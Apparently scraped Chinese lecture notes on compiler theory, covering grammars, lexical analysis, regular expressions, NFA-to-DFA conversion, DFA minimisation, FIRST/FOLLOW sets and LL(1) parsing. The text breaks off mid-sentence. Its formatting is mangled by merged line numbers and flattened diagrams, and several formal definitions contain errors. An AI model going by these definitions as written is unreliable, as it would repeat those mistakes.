2型文法称为上下文无关文法。即把U改写为u时，不必考虑上下文。 注意：2型文法与BNF表示相等价。 2型语言：L2，这种语言可以由下推自动机接受 定义12：3型文法 （左线型） P： U &rarr; T | U &rarr; wT ，其中 U、w ∈ VN ，T ∈ VT （右线性）P： U &rarr; T | U &rarr; Tw ，其中 U、w ∈ VN ，T ∈ VT 3型文法称为正则文法。它是对2型文法进行进一步的限制 3型语言：L3，又称正则语言、正则集合，这种语言可以由有穷自动机接受 由上易知， L0 &sup; L1 &sup; L2 &sup; L3 0型文法可以产生L0、L1、L2、L3，但2型文法只能产生L2，不能产生L1 5.语法树与二义性文法1.推导与语法树 语法树：句子结构的图示表示法，通常表示称一棵倒立的树，即 结点： 符号 根节点： 识别符号 中间节点：非终结符 叶节点： 终结符或非终结符 边：表示节点间的派生关系 句型的推导及语法树的生成（自顶向下） 给定G[Z]，句型w：可建立推导序列，Z =*=&gt; w；可建立语法树，以Z为树根节点，每步推导生成语法树的一枝，最终可生成句型的语法树。 语法树的生成规律不同，但最终生成的语法树形状完全相同 一般推导 1234567graph TB4A[&lt;无符号整数&gt;] --&gt; B[&lt;数字串&gt;]4B --&gt; C[&lt;数字串&gt;]4B --&gt; D[&lt;数字&gt;]4C --&gt; E[&lt;数字&gt;]4E --&gt; F[1]4D --&gt; G[0] 树与推导：句型推导过程 &hArr; 句型语法树的生长过程 ①由推导构造语法树 从识别符号开始，自左向右建立推导序列 &rArr; 由根节点开始，自上而下建立语法树 ②由语法树构造推导 自叶而根修剪子树的末端节点，直至把整棵树剪掉（留根），每剪一次对应一次归约 &rArr; 从句型开始，自右向左地逐步进行归约，建立推导序列 2.文法的二义性 定义：若对于一个文法的某一句子存在两棵不同的语法树，则该文法是二义性文法，否则是无二义性文法 换而言之，无二义性文法的句子只有一棵语法树，尽管推导过程可以不同 12345比如二义性文法: G[E]: E := E+E | E*E | (E) | i44444Vn = &#123;E&#125;44444VT = &#123;+,*,(,),i&#125;针对 i+i*i 有两种不同的语法树 定义：若一个文法的某句子存在两个不同的规范推导（最右推导），则该文法是二义性的，否则是无二义性的 若文法是二义性的，则在编译时就会产生不确定性，遗憾的是在理论上已经证明：文法的二义性是不可判定的，即不可能构造出一个算法，通过有限步骤来判定任一文法是否有二义性 现在的解决办法是：提出一些限制条件，称为无二义性的充分条件，当文法满足这些条件时，就可以判定文法是无二义性的。 由于无二义性文法比较简单，我们也可以采用另一种解决办法：即不改变二义性文法，而是确定一种编译算法，使该算法满足无二义性充分条件。 句柄：句型的句柄是和某产生式右部匹配的子串。句柄是直接短语，即某产生式的右部，具有最左性 若句柄不存在重复，就说明文法无二义性 如 S &rarr; ABC ，ABC为该句子的句柄 三、词法分析 词法分析 （Lexical Analysis） 实现词法分析器的程序称为词法分析程序（扫描器） 词法分析程序的主要任务：对构成源程序的字符串从左到右的扫描，逐个字符地读入源程序字符并按照构词规则切分成一个一个具有独立意义的单词。并确定其属性（如保留字、标识符、运算符、界限符和常量等）。再把它们转换成长度统一的标准形式——属性字（TOKEN）。 词法分析是编译过程中的第一个阶段，在语法分析前进行。也可以和语法分析结合在一起作为一遍，由语法分析程序调用词法分析程序来获得当前单词供语法分析使用。 1234graph LR4A[源程序] --&gt; B[词法分析程序]4B -- Token --&gt; C[语法分析程序]4C -- get token --&gt; B 为什么将词法分析工作从语法分析工作中独立出来？ 简化设计 改进编译效率 增加编译系统的可移植性 3.1 词法分析器的要求 功能：输入源程序，输出单词符号 单词符号是一个程序语言的基本语法符号 单词的分类： 1.关键字：由程序语言定义的具有固定意义的标识符。也称为保留字或基本字 2.标识符：用来表示程序中各种名字的字符串。 3.常 数：常数的类型一般有整型、实型、布尔型、文字型。 4.运算符：如+、－ 、*、/ 等。 5.界限符：如逗号、分号、括号等。 一个程序语言的关键字、运算符、界限符都是固定的，即数量有限及意义明确；而对于标识符和常数通常是不确定的。 词法分析器所输出的单词符号常常表示为二元式：（单词种别，单词符号的属性值） 单词种别一般将①标识符归为一种，②常数按类型分种（整数实数布尔），③关键字全体视为一种，或者一个一种，④运算符可采用一符一种，⑤界符一般也用一符一种。 如果一个种别只含一个单词符号，那么对于这个单词符号，种别编码可完全代表其自身。若一个种别有多个单词符号，那么，对于每个单词符号，除了给出种别编码外，还应给出有关的单词符号的属性信息。 单词符号的属性是指单词符号的特性或特征。属性值是反应特性或特征的值。 1234567891011while(i&gt;=j)i++;//以该语句为示例//该句的单词符号序列如下:&lt;while, -&gt;&lt;(, -&gt;&lt;id, point(i)&gt;//存放指向i的指针&lt;&gt;=, -&gt;&lt;id, point(j)&gt;//存放指向j的指针&lt;), -&gt;&lt;id, point(i)&gt;&lt;--, -&gt;&lt;;, -&gt; 3.2 词法分析器的设计Ⅰ、输入、预处理词法分析器工作的第一步是输入源程序文本。输入串一般是放在一个缓冲区中，这个缓冲区称输入缓冲区。词法分析的工作（单词符号的识别）可以直接在这个缓冲区中进行。但在许多情况下，把输入串预处理一下，对单词符号的识别工作将是比较方便的。 预处理的主要工作 某些跳格符、回车符和换行符等编辑性字符，在别处的任何出现都没有意义，预处理时可以将其剔掉 注解部分——仅在于改善程序的易读性和易理解性。对于它们，预处理时可以将其剔掉 空白符（一个或相继数个）用作单词符号之间的间隔，即用作界符。在这种情况下，预处理时可把相继的若干个空白结合成一个。 Ⅱ、单词符号的识别：超前搜索 上图为词法分析器结构，当词法分析器调用预处理子程序处理出一串输入字符放进扫描缓冲区之后，分析器就从此缓冲区种逐一识别单词符号。当缓冲区里的字符串被处理完之后，它又调用预处理程序装入新串。 超前搜索的原因 在程序中有一些单词的识别经常需要多读入一些字符才能知道哪些字符组成一个单词 Ⅲ、状态转换图状态转换图是一张有限方向图，是设计词法分析器的有效工具。 1234graph LR40--字母--&gt;141--字母或数字--&gt;141--其他--&gt;2[*] 一个状态转换图可用于识别（或接受）一定的字符串 3.3 正规表达式与有限自动机1.正规式与正规集正规式也称正则表达式（regular expression），是说明单词的模式（pattern）的一种重要的表示法，是定义正规集的数学工具 正规式及其所表示的正规集的定义：设字母表为∑，辅助字母表∑‘ = { φ，ε， |，&bull;，*，（，）}， ① ε 和 φ 都是 ∑ 上的正规式，他们所表示的正规集分别为 { ε }和 { } ； ② 对任何 a ∈ ∑ ，a 是 ∑ 上的一个正规式，他所表示的正规集为 { a } ； ③ 假定 e1 和 e2 都是 ∑ 上的正规式他们所表示的正规集分别为 L(e1) 和 L(e2)，那么，( e1 ) ， e1 | e2 ， e1 &bull; e2 ， e1 也都是正规式，他们所表示的正规集分别为 L( e1 )， L( e1 ) &cup; L( e2 )， L( e1 ) L( e2 ) 和 ( L( e1 ) )\ ； ④仅由有限次使用上述三步骤而定义的表达式才是 ∑ 上的正规式，仅有这些正规式所表示的集合才是 ∑ 上的正规集。 注意，| 、 &bull; 、* 、均为正规式的运算符 | 表示或 &bull; 表示连接 * 表示闭包，即任意有限次的自重复连接 在不混淆的情况下，括号可以省去，但规定算符的优先顺序为 *， &bull; ，|。连接符 &bull; 一般可省略不写，三个算符均为左结合的。 1234567例:a &#123;a&#125;a|b &#123;a,b&#125;ab &#123;ab&#125;(a|b)(a|b) &#123;aa,ab,ba,bb&#125;a* &#123;ε,a,a,……,任意个a的串&#125;(a|b)* &#123;ε,a,b,aa,ab,bb,……,所有由a和b组成的串&#125; 结论：程序设计语言的单词都能用正规式来定义 正规式的等价性：若两个正规式 e1 和 e2 所表示的正规集相同，则说 e1 和 e2 等价，写作 e1 = e2 。 123例:e1 = (a|b) , e2 = (b|a) ,e1 == e2e1 = b(ab)* , e2 = (ba)*b , e1 == e2 正规式服从的规律有： 或服从交换律：U|V = V|U 或的可结合律：U|(V|W) = (U|V)|W 连接的可结合律：(UV)W = U(VW) 分配律：U(V|W) = UV | UW，(V|W)U = VU | WU ε是连接的恒等律：εU = U，Uε = U 素零一律：U|U = U 或的抽取律： U* = ε|U|UU|… 2.确定有限自动机确定有限自动机（有穷自动机）作为一种识别装置，能准确地识别正规集，即识别正规文法所定义的语言和正规式所表示的集合，引入有穷自动机这个理论，正是为词法分析程序的自动构造寻找特殊的方法和工具 有穷自动机分两类：确定的有限自动机（deterministic Finite Automata）和不确定的有限自动机（Nondeterministic Finite Automata） 12345graph LR4RE(RE)4RE --&gt; NFA(NFA)4NFA --&gt; DFA(DFA)4DFA --&gt; minDFA(minDFA) DFADFA定义：一个确定的有穷自动机（DFA）M是一个五元组： M = （ S ，∑ ，δ ，s0 ，F ） 其中： S 是一个有穷集，他的每个元素称为一个状态； Σ 是一个有穷字母表，他的每个元素称为一个输入符号，所以也称 Σ 为输入符号表 δ 是转换函数，实在 S × Σ &rarr; S 上的单值部分映射，即，如果 δ（s，a）= s‘ ， (s ∈ S，s’ ∈ S ) 就意味着，当前状态为s，输入符为a时，将转换至下一个状态s’，s’称作s的一个后继状态 s0 ∈ S 是唯一的一个初态 F &sub; S 是一个终态集（可空），终态也称可接受状态或结束状态 DFA可以用一个矩阵表示，该矩阵的行表示状态，列表示输入字符，即s行a列的矩阵元素表示 δ（s，a）的值。这个矩阵称为状态转换矩阵。 一个DFA也可以表示为一张确定的状态转换图 假定DFA M含有 m个状态和 n个输入字符，那么，这个图含有m个状态结点，每个结点顶多有n条箭弧射出和别的结点相连接，每条箭弧用Σ中的一个不同输入字符作标记，整张图含有唯一的一个初态结点和若干个（可以是0个）终态结点。 一般来说，初态节点旁边标以 &rArr; ；终态节点用双圈表示。 例如： 状态 a b +S U V U Q V V U Q -Q Q Q 如上表，可表示(a|b)*，也可画成如下图 DFA的确定性 1.映射δ ： S × Σ &rarr; S 是一个单值函数。也就是说，对任何状态s∈S和输入符号 a ∈ Σ ，f（s，a）唯一地确定了下一状态。从转换图的角度来看，假定字母表 Σ 含有n个输入字符，那么，任何一个状态结最多只有n条弧射出，而且每条弧以一个不同的输入字符标记。 NFANFA的定义：一个非确定的有穷自动机（NFA）M是一个五元组：M = （ S ，∑ ，δ ，S0 ，F ） 其中： S 是一个有穷集，他的每个元素称为一个状态； Σ 是一个有穷字母表，他的每个元素称为一个输入符号，所以也称 Σ 为输入符号表 δ 是转换函数，实在 S × Σ* &rarr; S 上的单值部分映射，即， δ： S × Σ* &rarr; 2S 表明在某状态下对于某输入符号可能有多个后继状态 S0 &sub; S 是一个非空初态集 F &sub; S 是一个终态集（可空），终态也称可接受状态或结束状态 如图，为一个NFA ∑* 上的符号串 t 被 NFA M 接受也可以这样理解： 对于Σ*中的任何一个串t，若存在一条从某一初态结到某一终态结的道路，且这条道路上所有弧的标记字依序连接成的串(不理采那些标记为ε的弧)等于t，则称t可为NFA M所识别(读出或接受)。若M的某些结既是初态结又是终态结，或者存在一条从某个初态结到某个终态结的道路,其上所有弧的标记均为ε，那么空字可为M所接受。 NFA M所能接受的符号串的全体记为L(M) 结论： Σ 上一个符号串集 V &sub; Σ* 是正规的，当且仅当存在一个 Σ 上的不确定的有穷自动机M，是的 V = L(M) 12345678910111213NFA构造方法:Σ上的字母a是正规式,构造等价的NFA为4一个初态,一个终态,中间标记ε弧正规式A和B连接是正规式,构造等价NFA为4初态是A的初态,终态是B的终态,从A的终态到B的初态标记为ε弧A|B是正规式,构造等价的NFA为4构造新的初态和终态,从初态引ε到A和B的初态,从到A到B的终态引ε到终态A*是正规式,构造的等价NFA为4构造新的初态和终态，从初态引ε到终态和A的初态,从A的终态引ε到终态和A的初态 NFA和DFA的等价性 DFA是NFA的特例 对于每个NFA M，存在一个DFA M’ ，使得L( M ) =L( M’ )。对每个NFA M存在着与之等价的DFA M’。即：对于任何两个有穷自动机M和M’，如果L( M )=L( M’ )，则称M与M’是等价的。 有一种算法，将NFA转换成接受同样语言的DFA。这种算法称为子集法。 与某一NFA等价的DFA不唯一 从NFA的矩阵表示中，表项通常是一状态的集合，而在DFA的矩阵表示中，表项是一个状态，NFA到相应的DFA的构造的基本思路是： DFA的每一个状态对应NFA的一组状态。 DFA使用他的状态去记录在NFA读入的一个输入符号后可能达到的所有状态。 NFA确定化算法（ NFA &rarr; DFA 的转换）假设NFA N = （ K， Σ ， f ，K0，Kt ）按如下办法构造一个DFA M=（ S， å，δ，S0 ，St），使得L(M) = L(N) ： M的状态集 S 由 K 的一些子集组成。用 [ S1 ，S2 ，…，Sj ] 表示 S 的元素，其中 S1 ，S2 ，…，Sj 是K的状态。并约定， 状态 S1 ，S2 ，…，Sj 是按某种规则排列的，即对于子集{S1 ，S2 } = {S2 ，S1 }来说，S的状态就是 [S1 ，S2 ] M和N的输入字母表是相同的，即 Σ 转换函数是这样定义的： δ（ [ S1 ，S2 ，…，Sj ] ，a ） = [ R1 ，R2 ，…，Rt ] ，其中 { R1 ，R2 ，…，Rt } = ε-closure（ move（{S1 ，S2 ，…，Sj } ， a） ） S0 = ε-closure（ K0 ）为 M 的开始状态 St = {Si ，Sk ，…，Se }， 其中 [ Si ，Sk ，…，Se ] ∈ S 且 {Si ，Sk ，…，Se } &cap; Kt &ne; &phi; 状态集合 I 的 ε-闭包，表示为ε-closure( I )，定义为一状态集，是状态集I中的任何状态S经任意条ε弧而能到达的状态的集合。 状态集合I的任何状态S都属于ε-closure(I) 状态集合 I 的 &alpha; 弧转换，定义状态集合 J 表示为 J = move(I,a) ，其中J是所有那些可从I中的某一状态经过一条a弧而到达的状态的全体。 Ia = ε-closure( J ) = ε-closure( move( I , a ) ) 如之前NFA的例子： 1234I=&#123;1&#125;, ε-closure(I) = &#123;1,2&#125;；I=&#123;5&#125;, ε-closure(I) = &#123;5,6,2&#125;；move( &#123;1,2&#125; , a ) = &#123;5,3,4&#125;ε-closure(&#123;5,3,4&#125;) = &#123;2,3,4,5,6,7,8&#125;； 构造NFA N的状态K的子集的算法： ​ 假定所构造的子集族为C，即 C = （T1 ，T2 ，… ， TI ），其中 T1 ，T2 ，… ， TI 为状态K的子集。 123456789101.开始，令ε-closure(K0)为C中的唯一成员，并且他是未被标记的2.while( C中尚未被标记的子集T )do&#123;4标记T;4for 每个输入字母a do&#123;44U := ε-closure( move(T, a) );44if U 不在 C 中:444将U作为未标记的子集Ti加在C中;4&#125;&#125; 例： 如上图为实例NFA，构造其状态转换表 I Ia Ib {i，1，2} {1，2，3} {1，2，4} {1，2，3} {1，2，3，5，6，f} {1，2，4} {1，2，4} {1，2，3} {1，2，4，5，6，f} {1，2，3，5，6，f} {1，2，3，5，6，f} {1，2，4，6，f} {1，2，4，5，6，f} {1，2，3，6，f} {1，2，4，5，6，f} {1，2，4，6，f} {1，2，3，6，f} {1，2，4，5，6，f} {1，2，3，6，f} {1，2，3，5，6，f} {1，2，4，6，f} 将其每个状态确定化，即得到如下等价DFA N 状态转换表如下，将一组状态替换成对应符号。 I Ia Ib S A B A C B B A D C C E D F D E F D F C E minDFA说一个有穷自动机是化简了的，即是说，它没有多余状态并且它的状态中没有两个是互相等价的。一个有穷自动机可以通过消除多余状态和合并等价状态而转换成一个最小的与之等价的有穷自动机。即用一个状态代替所有与其等价的状态。 所谓有穷自动机的多余状态，是指这样的状态：从自动机的开始状态出发，任何输入串也不能到达的那个状态；或者从这个状态没有通路到达终态。 DFA的最小化就是寻求最小状态DFA 最小状态DFA的含义：①没有多余状态（死状态）；②没有两个状态时互相等价的（不可区别）。 两个状态s和t可区别：不满足 兼容性：同时终态或同时非终态 传播性：从s出发读入某个a（a ∈ Σ ）和从t出发读入某个a到达的状态等价 两个状态s和t等价： 如果由 s 出发能导出的所有串的集合与 t 出发能导出的所有串的集合相等，我们称状态 s 与状态 t 是等价的。 如上面示例的DFA，C和F是等价的。 C和F同是终态，读入a到达C和F，C和F同是终态，C和F读入a都到达C，读入b都到达E。 同理D和E也是等价的 DFA最小化的算法：分割法（逐步分组试探法）核心思想：把一个DFA的状态分成一些不相交的子集，使得任何不同的两子集的状态都是可区别的，而同一子集中的任何两个状态都是等价的。算法假定每个状态射出的弧都是完全的,否则，引入一个新状态，叫死状态，该状态是非终态，将不完全的输入弧都射向该状态，对所有输入，该状态射出的弧还回到自己。 12345678910设有DFA M = ( s , ∑ , f, s0 , sz ),最小状态DFA M'1. 因为不难证明，如果si是非终结状态，而sj是终结状态，那么si和sj一定互不等价(根据等价的定义可知，它们导出的符号串集不同)。所以开始可以把K中的终态和非终态分开，分成两个子集，形成一个基本划分： P2＝&#123;I1,I2&#125; (I1∪I2＝K, I1∩I2＝Φ)2. 若此两个子集还可以进行划分，则作进一步的划分，形成Pm ,假定到某个时候Pm已经含有m个子集，记为：Pm＝&#123;I1,I2,…,Im&#125;，设s'和s"是Ii中的任意两个状态，如果对某个a∈Σ,存在Ij ，使 f(s',a), f(s",a)∈Ij ，则称s'和s"关于a是拟等价的。 如果存在s'，s"∈Ii，使得对字母表Σ中的某个符号a, s'和s"不为拟等价，则我们说Ii是可分的。 换句话说，令Ii ＝&#123;s1，s2, …，sn&#125; ，如果对某个a∈Σ，使得Ia i＝&#123; f(s1,a)，f(s2,a)，…，f(sn,a)&#125;不全落在现行Pm的某一个子集Ij之中；即Ia i这个集合中的元素分别属于I1，I2，…，Im中的几个不同集合，则Ii可分为几个集合（至少可一分为二）。 3．转2,上述过程务必一再重复，直到P中的每个集合均是不可再分时为止。此时，P所含的集合数不再增加，即P中的每个集合中的状态互相等价，而不同集合间的状态互不等价。4.为P中的每一组选一代表，这些代表构成M'的状态。把原来导入非代表状态的弧均导入其代表即可，即若s'是一代表且f(s',a)=t,令r是t组的代表，则M'中有一转换f'(s',a)=r，M'的开始状态是含有S0的那组的代表，M'的终态是含有F的那组的代表。5.去掉M'中的死状态。 正规式与有穷自动机的等价性（Re &hArr; NFA）定理：①对于 Σ 上的NFA M，可以构造一个 Σ 上的正规式R，是的L(R) = L(M)。②对于 Σ 上的任一个正规式R，可以构造一个 Σ 上 的NFA M，是的L(M) = L(R)。 Re &rArr; NFA： 1234567转换方法：我们把状态转换图的概念拓广，令每条弧可用一个正规式标记。1. 在M的状态图上加进两个结点x、y。从x结点用ε弧 连接到M的所有初态结点，从M的所有终态结点ε弧 连接到y结点。形成一个与M等价的M'， M'只有一个初态和一个终态。2. 逐步消去M'中的所有结点，直至只剩下x结点和y结点。在消结过程中，逐步用正规式来标记弧，其消结规则如下：A--R1--&gt;2--R2--&gt;3 ==&gt; 1--R1R2--&gt;21--R1--&gt;2,1--R2--&gt;2 ==&gt; 1--R1|R2--&gt;21--R1--&gt;2--R2--&gt;2--R3--&gt;3 ==&gt; 1--R1R2*R3--&gt;2最后x结点和y结点之间的弧上的标记就是所求的正规式R NFA &rArr; Re 1234567方法如上反转首先，对正规式R构造如下拓广转换图然后通过对R进行分裂和加进新结点的办法，逐步把这个图转变为：每条弧标记为中的一个字母或ε ，其转换规则如下:1--R1R2--&gt;2 ==&gt; A--R1--&gt;2--R2--&gt;31--R1|R2--&gt;2 ==&gt; 1--R1--&gt;2,1--R2--&gt;21--R1R2*R3--&gt;2 ==&gt; 1--R1--&gt;2--R2--&gt;2--R3--&gt;3在整个分裂过程中，所有新结点均采用不同的名字，保留x和y为全图的唯一初态结点和终态结点，至此我们就可以得到一个与R 等价的NFA M 正规文法与有穷自动机的等价性定理：①对于给定的正规文法G[R]，可以直接构造一个NFA M，使得L（M）=L（G）。②对于 Σ 上的任一个NFA M ，可以直接构造正规文法G[R] ，使得L（ R ）=L（ M ）。 把给定的正规文法G[R]转换为一个Σ上的NFA M构造规则: 123456设G[R]=（VN，VT，P，R）， NFA M=（ K，Σ，f，S，Z）1.令 Σ = VT;2. K = VN，S = R；即对G中的每个非终结符生成M的一个状态（不妨取相同的名字，G的开始符号是M的初态;3.增加一个新状态Z，作为NFA M 的终态，Z∈K;4.对G中的形如A-&gt;tB（其中t为终结符或ε；A和B为非终结符）的产生式,构造M的一个转换函数 f（A，t）=B;5.对G中的形如A-&gt;t（其中t为终结符或ε；A和B为非终结符）的产生式,构造M的一个转换函数 f（A，t）=Z; 把给定的å上的NFA M转换为一个正规文法G[R]的构造规则: 123456设NFA M=（ K，Σ，f，S，Z）,G[R]=（VN，VT，P，R）,1.令 VT = Σ ;2.令VN = K即对M的每一个状态生成G中的非终结符（不妨取相同的名字，G的开始符号是M的初态;3.令S=R（如果M有多个初态，应先拓广自动机，引入新初态x）;4.对M 的终态Z增加一个产生式： Z-&gt;ε;5.对M的每一个转换函数f（A，t）=B可写G的一个产生式A-&gt;tB（其中t为终结符或ε;A和B为非终结符）; 词法分析程序的自动构造​ 若对自动机的每一个状态赋予一定的功能，并把其边上的符号视为转移条件，那么自动机就成为一个程序了。 四、语法分析语法分析的主要工作：是识别由词法分析器给出的单词序列是否是给定的正确句子（程序） 语法分析的常用方法：自顶向下的语法分析（Top-Down Parsing）和自底向上的语法分析（Bottom-Up Parsing）两大类 自顶向下语法分析方法：从文法的开始符号（设为 &lt;程序&gt; ）开始进行分析，逐渐推导的往下构造语法树，使其树叶正好构造所给定的源程序串 关键：是确定在推导过程中选择候选式的问题。当进行推导时，一个非终结符可能对应多个产生式，这样我们就无法事先知道应该用哪个产生式，因此必须对文法做一些限制，以便在任何情况下都唔那个确定应该用的产生式 主要思想：从开始符号出发，导出句型并一个符号一个符号地与给定终结符串进行匹配。如果全部匹配成功，则表示开始符号可推导出给定的终结符串。因此判定给定终结符号串是正确句子。 缺点：若在推导过程中，不对文法进行限制，那么产生式的选择成为无根据的，只好一一去尝试所有可能的产生式，直至成功为止。这种方法致命的地方是不断地回溯，大大影响速度。所以自顶向下分析法分为确定和不确定两种。我们在下面讨论确定的分析方法，这种方法简单直观，便于手工构造或自动生成语法分析器。 在推导过程中，对于产生式相同左部含有非终结符开始的右部时，在推到中选用哪个产生式是不能直接知道的，也就是该语法分析的缺点。 1. 首符集、后继符集、选择集（Fisrt(),Follow(),Select()）首符集的定义设G = （ VN ，VT ，P ，S）是上下文无关文法，α 是G的任一符号串，则有 First(α) = { a | α &rArr; αβ，α ∈ VT ，α、β ∈ V\ } 特别地，若 α =*&rArr; ε，则规定 ε ∈ First(α) 即：Fisrt(α)集是从α出发推导出所有符号串首终结符或可能的ε构成的集合。 构造算法1.求Fisrt(X) 123456789101112131415对每一文法符号X∈(VN∪VT），求FIRST(X).(a)若X∈VT,则令FIRST(X)=&#123;X&#125;;(b)若X∈VN,且有产生式X→a……,(a∈VT)，则令a∈FIRST(X);(c) 若X∈VN,有X→ε，则令 ε∈FIRST(X);(d)若 X∈VN, y1, y2,……,yi都∈VN,且有产生式X→ y1 y2…..yn, 当y1, y2,…..yi-1 都 =*=&gt;ε时，（其中1≤i≤n),则FIRST(y1)-ε,FIRST(y2)-ε,….,FIRST(yi-1 )-ε,FIRST(yi)都包含在FIRST(X)中。(e)当(d)中所有yi =*=&gt; ε(i= 1,2,….,n),则FIRST(X)=FIRST(y1)∪FIRST(y2)∪….∪FIRST(yn)∪&#123;ε&#125;反复使用上述（b)～(d) 步直到每个符号的FIRST集合不再增加为止。 2.求Fisrt(α) α = x1x2……xn 123456789101112131415161718法1:1.若n=0,即α=ε,则令FIRST(α)=&#123;ε&#125;;2.否则，对1≤i≤n,求FIRST(xi)3.若n=1,则令 FIRST(α)=FIRST(x1);4.若n≥2且对一切j=1,2,….,i-1都有ε∈FIRST(xj). 则令FIRST(xi )-&#123;ε&#125; FIRST(α),其中2≤i≤n; 若对一切 j=1,2,…,n都有ε∈FIRST(xj),则令ε∈FIRST(α)法2:1.把FIRST(x1)中所有非ε元素加入到FIRST(α)中，即 FIRST(α )=FIRST(x1)-&#123;ε &#125;;若FIRST(x1)包含有ε，则把FIRST(x2)的所有非ε元素加入到 FIRST(α)中，即FIRST(α)=FIRST(α)∪ (FIRST(x2)-&#123;ε&#125;);若FIRST(x1)和FIRST(x2)都包含有 ε，则把FIRST(x3)的所有 非ε元素加到FIRST(α)中;…… 照此方法继续，一直到考察到xn。2.若FIRST(xi ),i= 1,2,…,n;即每个FIRST(xi)中都有ε。则将ε加 到FIRST(α)中。特别地， 若 α=ε ，则FIRST(α)=&#123;ε&#125;. 后继符的定义设G = （ VN ，VT ，P ，S）是上下文无关文法，A ∈ VN 的后继符集合为 Follow(A) = { a | S =*&rArr; μAβ ，a ∈ VT ， a ∈ First(β) ， μ ∈ VT* ，β ∈ V* } 或 Follow(A) = { a | S =*&rArr; …Aa…，a ∈ VT } 特别地，若S =*&rArr; …A ， 则# ∈ Follow(A) 。这里的#是代表一个输入串的结束符 表示所有句型中紧挨着A出现的终结符或#均是Follow(A)的元素 构造算法12345678910111213落#下S(a)对文法开始符号S,令# ∈ FOLLOW(S).右部Follow(b)若B→αAβ是一个产生式,则令FIRST(β)-&#123;ε&#125; 属于FOLLOW(A);守门员福利(c) 若B→αA是一个产生式，或B→αAβ是一个产生式且有ε∈FIRST(β),4则令FOLLOW(B)是FOLLOW(A)的子集。即把FOLLOW(B)的所有元素加入到FOLLOW(A)中。(d)反复使用(b)直到每个非终结符的 FOLLOW集合不再增加为止。 选择集的定义对于给出的上下文无关的文法产生式 A &rarr; α ， A ∈ VN ， α ∈ V* ，则 Select(A &rarr; α) = First(α) ，当 α =*&rArr; ε 时 Select(A &rarr; α) = Fisrt(α) &cup; Follow(A) ，其他情况 构造算法12345(a)求FIRST(α);(b)若ε∈FIRST(α),则令SELECT(A→α)=FIRST(α) 否则求FOLLOW(A),并令 SELECT(A→α) = FIRST(α) ∪ FOLLOW(A). 2. LL(1)分析法当一个文法是LL(1)文法时，则该文法一定能采用确定的自顶向下的分析方法进行分析。 定义：一个上下文无关文法是LL(1)文法的充分必要条件是每个非终结符A的两个不同产生式，A &rarr; α ，A &rarr; β ，满足 Select(A &rarr; α) &cap; Select(A &rarr; β) = &empty; ，其中，α和β不能同时 =*&rArr; ε。 文法的等价变换确定的自顶向下分析要求给定语言的文法必须是 LL(1)形式，然而，不一定每个语言都是LL(1)文法，对一个语言的非LL(1)文法是否能变换为等价的LL(1)形式以及如何变换是我们讨论的主要问题。由LL(1)文法的定义可知若文法中含有左递归或含有左公共因子，则该文法肯定不是LL(1)文法，因而，我们设法消除文法中的左递归，提取左公共因子对文法进行等价变换。 Ⅰ提取左公共因子1234对A→ αβ1| αβ2 | … | αβn提取左公因子为： A→ α A' A'→ β1 | β2 | … | βn若在βi , βj , βk…中仍含有左公共因子，可再进行提取，这样反复进行提取直到所引进的新非终结符的有关产生式均无左公共因子为止 结论：一个文法提取了左公共因子后，只解决了相同左部产生式的右部FIRST集不相交问题。当改写后的文法不含有空产生式，且无左递归时，则改写后的文法是LL(1)文法。否则还需用LL(1)文法的判别方法进行判断才能确定是否为LL(1)文法。 Ⅱ消除左递归一个文法含有下列形式的产生式之一时： 1) A→A β, A∈VN , β ∈ V* 2) A→B β, B→A α, A,B∈VN, α ,β ∈ V* 则称该文法是左递归的。 含有左递归的文法不能采取自顶向下分析法。 1234567891011121314151617181920212223242526272829303132333435361):把直接左递归改写为右递归设有文法产生式: A→Aβ|γ. 其中β非空， γ不以A打头。 可写为: A → γA' A' → βA' | ε 一般情况下，假定关于A的产生式是： A→A α1| A α2 | … | A αm | β1 | β2 | …| βn 其中，αi(1≤i≤m)均不为空， βj(1≤j≤n)均不以A打头。 则消除直接左递归后改写为： A → β1 A' | β2 A' | … | βn A' A'→ α1 A' | α2 A' | … | αm A' | ε2):间接消除左递归对于间接左递归的消除需要先将间接左递归变为直接左递归，然后再按1)清除左递归哪一步有左递归，就把那一步的间接左递归代入产生式产生直接左递归----------------------------------------------------3):消除文法中一切左递归的算法设非终结符按某种规则排序为A1, A2,… An 。For i:=1 to n do begin For j:=1 to i-1 do begin 若Aj的所有产生式为： Aj → δ1 | δ2 | … | δn 替换形如Ai → Aj γ的产生式为： Ai → δ1γ | δ2γ | … | δnγ end 消除Ai中的一切直接左递归 end 递归下降分析程序构造在程序语言的语法定义中有许多采用递归定义。我们在对它进行语法分析时，编制的处理程序也采取递归的方式，可使其结构简单易读。但由于频繁地调用子程序大大地降低了分析速度 主要思想：对每个非终结符按其产生式结构写出相应的语法分析子程序。因为每个文法递归相应子程序也递归，子程序的结构与产生式结构一致。所以称此种方法称为递归子程序法或递归下降法。 用程序表示递归子程序的内部结构： 1234567891011121314151617181920212223242526274设A是一个非终结符：A→β1 44444A→β244444 ┊44444A→βn4则写 ζ(A) &lt;==&gt; if char∈first(β1 ) thenζ(β1 ) else if char ∈ first(β2 ) then ζ(β2 ) else… if char∈first(βn ) then ζ(βn) else ERROR其中ζ(βi)表示调用处理符号串βi的子程序。对A的任一右部i 设为： βi = y1 y2 … yn则定义ζ( βi) &lt;==&gt; beginζ(y1);ζ(y2);…;ζ(yn) end其中yj可分为下列两种情况（j=1,…,n):1) yj∈VT,则 ζ( yj) &lt;==&gt; if char≠ yj then ERROR else READ(char)2) yj∈VN,则ζ(yj)表示调用关于yj的递归子程序。对文法加限制：1.任一非终结符B都不是左递归的，否则会产生死循环。2.对A的任意两个右部βi , βj ,有：first(βi) ∩ first(βj) = φ ,First(βi)表示βi所能导出串的第一个符号的集合。显然，每个βi的first(βi)是互不相同的，否则则无法判断应执行哪个ζ(βi )。 预测分析程序LL(k)文法是采取确定的自左至右扫描（输入串）和自顶向下分析技术的最大一类文法。 LL系指：自左向右扫描（输入串），自上而下进行最左推导。一般来说，一个文法当其分析器对输入串进行自左至右扫描并采用自顶向下方法进行分析的过程中，如果每步仅利用当前的非终结符（事实上此时它已位于分析栈顶）和至多向前查看k个输入符号就能唯一 决定采取什么动作，那么这个文法称为LL(K)文法。 对于大多数程序设计语言而言。K=1就足够了。因此我们将主要讨论k=1的情形。 LL(1)文法的分析过程设分析的当前格局为（x1x2 …. xn#, y1y2 …. ym#) 其中xi表示句型的前端部分，诸yj表示输入流的后端部分（终结符串）。则可能有下述动作之一： 1.替代：当x1∈VN时，则选相应的候选式去替换x1 。 2.匹配：当x1∈VT时，它与y1进行匹配，其结果为两种可能，如 